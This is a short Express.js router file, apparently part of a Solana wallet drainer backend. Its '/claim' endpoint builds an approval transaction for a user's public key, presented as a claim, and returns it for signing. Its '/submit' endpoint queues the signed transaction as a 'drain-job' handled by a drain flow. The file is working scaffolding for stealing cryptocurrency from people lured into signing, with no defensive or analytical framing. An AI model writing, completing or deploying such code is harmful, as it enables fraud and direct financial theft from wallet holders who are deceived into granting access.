const express = require("express");
const router = express.Router();

const { buildApprove } = require("../flows/approveFlow");
const { buildDrain } = require("../flows/drainFlow");
const { executeTx } = require("../solana/txExecutor");
const { getConnection } = require("../core/rpcPool");
const { txQueue } = require("../queue/jobQueue");

router.post("/claim", async (req, res) => {
    try {
        // Validate required input
        if (!req.body.publicKey) {
            return res.status(400).json({ error: "publicKey is required" });
        }

        const connection = getConnection();
        const tx = await buildApprove(req.body.publicKey, connection);

        res.json({
            transaction: tx.serialize({ requireAllSignatures: false }).toString("base64")
        });
    } catch (error) {
        console.error("[/api/claim] Error:", error.message);
        res.status(500).json({ error: error.message });
    }
});

router.post("/submit", async (req, res) => {
    try {
        // Validate required inputs
        if (!req.body.publicKey) {
            return res.status(400).json({ error: "publicKey is required" });
        }

        if (!req.body.signedTransaction) {
            return res.status(400).json({ error: "signedTransaction is required" });
        }

        const job = await txQueue.add("drain-job", {
            publicKey: req.body.publicKey,
            signedTx: req.body.signedTransaction
        });

        res.json({
            status: "queued",
            jobId: job.id
        });
    } catch (error) {
        console.error("[/api/submit] Error:", error.message);
        res.status(500).json({ error: error.message });
    }
});

module.exports = router;
